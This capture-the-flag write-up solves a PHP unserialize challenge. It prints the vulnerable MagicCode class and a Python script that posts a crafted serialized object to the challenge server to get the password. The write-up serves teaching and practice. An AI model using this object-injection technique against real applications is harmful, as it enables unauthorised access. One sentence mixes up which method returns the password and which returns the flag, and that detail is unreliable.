# Serialize (Web)

This challenge deserves highlighting because it required absolutely no guessing.

We have to deal with the following PHP code:

```php
<?php


class MagicCode {
    private $command;
    private $commandArgs;

    public function __construct($command, $commandArgs) {
        $this->command = $command;
        $this->commandArgs = $commandArgs;
    }

    function __wakeup() {
        foreach($this->commandArgs as $k => $v) {
            $this->commandArgs[$k] = $this->__clearArgs($v);
        }
    }

    function __clearArgs($v) {
        return trim($v);
    }

    function __die($text) {
        die(json_encode(array("text" => $text)));
    }

    function __destruct() {
        if (in_array($this->command, array("print", "showFlag", "showSource"))) {
            @call_user_func_array(array($this, "__" . $this->command), $this->commandArgs);
        } else {
            $this->__die("What do you do?");
        }
    }

    function __print() {
        global $PASSWORD;
        list($showPassword) = func_get_args();
        if ($showPassword == $this->__pack()) {
            $this->__die($PASSWORD);
        }
        $this->__die("Nothing to do. Just passing by.");
    }

    function __pack() {
        return pack("H*", "766676433466787856624046542574234161323453457431525177336325");
    }

    function __showFlag() {
        global $PASSWORD;
        global $FLAG;
        list($password) = func_get_args();
        if ($password === $PASSWORD) {
            $this->__die($FLAG);
        }
        $this->__die("Try again.");
    }

    function __showSource() {
        highlight_file(__FILE__);
    }
}
```

In the last line of code (that I somehow didn't copy), the POST data sent by the user is base64 decoded and unserialized.

It's obvious what to do here: we need to craft a MagicCode object.
The __destruct() method will be called by the runtime, and we will get a limited RCE on the server. In fact, it's enough to change `command` variable to `showFlag` to get "password" and `showSource` to get the flag.

Crafting PHP serialized payloads is relatively easy because the serialization format is human readable and not very complicated. I crafted the following by hand (although in retrospect, I should've just used the code provided and serialize() function):

```python
import requests

payload = '''O:9:"MagicCode":2:{s:18:"\x00MagicCode\x00command";s:5:"print";s:22:"\x00MagicCode\x00commandArgs";a:1:{i:0;s:30:"vfvC4fxxVb@FT%t#Aa24SEt1RQw3c%";}}'''

r = requests.post("https://magic-code.scs.ctf/", verify=False, data={"data": payload.encode('base64')})

print r.content
```

And this was enough to get the flag.